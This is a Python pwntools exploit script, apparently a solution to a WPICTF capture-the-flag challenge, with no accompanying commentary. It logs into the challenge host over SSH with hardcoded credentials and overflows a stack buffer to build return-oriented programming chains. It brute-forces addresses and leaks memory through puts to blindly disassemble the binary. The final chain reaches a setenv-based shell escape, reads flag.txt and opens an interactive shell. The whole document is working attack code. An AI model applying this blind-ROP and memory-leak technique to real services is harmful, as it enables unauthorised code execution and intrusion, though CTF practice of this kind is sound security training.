from pwn import *

CALL_PUTS = 0x400793
POP_RDI = 0x400843
POP_RSI_POP_R15 = POP_RDI - 2
LEA_RDI_aLesssecure_CALL_SETENV = 0x400780
a1 = 0x400881

def _send_payload_for_call_puts(r, addr):
	payload = ''
	payload += 'A' * 0x78
	payload += p64(addr)

	r.sendlineafter('https://www.imdb.com/title/tt0945513/\n', payload)

def _send_payload_for_pop_rdi(r, addr):
	payload = ''
	payload += 'A' * 0x78
	payload += p64(addr)
	payload += p64(CALL_PUTS)
	payload += p64(CALL_PUTS)

	r.sendlineafter('https://www.imdb.com/title/tt0945513/\n', payload)

def search(base, size):
	for addr in range(base, base + size):
		r = process('sshpass -p sourcelocker ssh source@source.wpictf.xyz -p 31337', shell=True)

		# _send_payload_for_call_puts(r, addr)
		_send_payload_for_pop_rdi(r, addr)

		try:
			log.info(hex(addr))
			print(repr(r.recv(timeout=1)))
		except:
			pass

		r.close()

def _recv(addr):
	r = process('sshpass -p sourcelocker ssh source@source.wpictf.xyz -p 31337', shell=True)

	payload = ''
	payload += 'A' * 0x78
	payload += p64(POP_RDI)
	payload += p64(addr)
	payload += p64(CALL_PUTS)

	r.sendlineafter('https://www.imdb.com/title/tt0945513/\n', payload)

	buf = r.recv()[:-1]

	r.close()

	return buf

def puts(addr, is_disasm=False):
	buf = _recv(addr)

	log.info(hex(addr))
	print(buf)
	if is_disasm:
		if len(buf) > 0:
			print(disasm(buf, arch='amd64'))

r = process('sshpass -p sourcelocker ssh -tt source@source.wpictf.xyz -p 31337', shell=True)

payload = ''
payload += 'A' * 0x78
payload += p64(POP_RSI_POP_R15)
payload += p64(a1 + 1)
payload += p64(0)
payload += p64(LEA_RDI_aLesssecure_CALL_SETENV)

r.sendlineafter('https://www.imdb.com/title/tt0945513/\r\n', payload)

payload = ''
payload += 'A' * 0x6d

r.sendlineafter('https://www.imdb.com/title/tt0945513/\r\n', payload)

r.sendline('!cat flag.txt')

r.interactive()
